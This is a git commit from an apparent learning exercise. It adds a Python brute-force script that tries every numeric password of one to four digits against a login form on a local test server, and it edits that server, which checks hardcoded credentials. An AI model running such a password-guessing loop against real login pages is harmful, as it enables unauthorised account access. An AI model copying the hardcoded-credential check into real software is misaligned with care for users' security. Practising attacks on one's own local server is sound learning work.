e6c6e07e60864783e51f51c26e16c9cda0b817da
princesssuna <1009suna@gmail.com>
2023-03-21 14:40:00 +0900

    feat: Link to Login page

--- bruteforce/bruteforce.py
+++ bruteforce/bruteforce.py
@@ -1,31 +1,19 @@
-# import itertools
+import itertools
 import requests
 
-로그인패킷 = {
-    'id' : 'seona',
-    'pw' : '1234',
-}
+str = '0123456789'
 
+for pwlen in range(1, 5):
+    for password in itertools.product(str, repeat=pwlen):
+        pw= ''.join(password)
+        print(pw)
+        loginpacket = {
+            'id' : 'seona',
+            'pw' : pw,
+        }
+        address = requests.post(f'http://127.0.0.1:8080/', data=loginpacket)
+        if address.text.find('success') > 0:
+            exit()
+            
 
-address = requests.post('http://127.0.0.1:8080/', data=로그인패킷)
-    
-'''
-문자열 = '0123456789'
-
-"""
-for i in 문자열:
-    for j in 문자열:
-        print(i, j);
-
-for i in 문자열:
-    for j in 문자열:
-        for k in 문자열:
-            print(i, j, k);
-"""
-
-for 패스워드길이 in range(1, 5):
-    for password in itertools.product(문자열, repeat=패스워드길이):
-        print(password)
-        print(''.join(password))
-'''
 
--- bruteforce/server.py
+++ bruteforce/server.py
@@ -7,6 +7,13 @@ class ServerHandler(BaseHTTPRequestHandler):
         self.send_response(200)
         self.send_header('content-type', 'text/html')
         self.end_headers()
+
+        f = open("index.html", 'r')
+        data = f.read()
+        f.close()
+        self.wfile.write(data.encode())
+
+        '''
         self.wfile.write('<p>GET</p>'.encode())
         print('GET Requests')
         self.wfile.write(self.path.encode())
@@ -16,18 +23,28 @@ class ServerHandler(BaseHTTPRequestHandler):
                              .encode())
         print(parser.parse_qsl(self.path.split('?')[1]))
         print(dict(parser.parse_qsl(self.path.split('?')[1])))
+        '''
 
     def do_POST(self):
         self.send_response(200)
         self.send_header('content-type', 'text/html')
         self.end_headers()
-        self.wfile.write('<p>POST</p>'.encode())
         print('POST Requests')
+        '''
+        self.wfile.write('<p>POST</p>'.encode())
         self.wfile.write(self.path.encode())
         self.wfile.write('<br/><br/>'.encode())
+        '''
         data = self.rfile.read(int(self.headers['Content-Length']))
         if data is not None:
             data_decode = dict(parser.parse_qs(data.decode()))
+        if data_decode['id'] == ['seona'] and data_decode['pw'] == ['1234']:
+            self.wfile.write('login success'.encode())
+        else:
+            f = open("index_fail.html", 'r')
+            data = f.read()
+            f.close()
+            self.wfile.write(data.encode())
         print(f'post params = {data_decode}')
 
 PORT = 8080
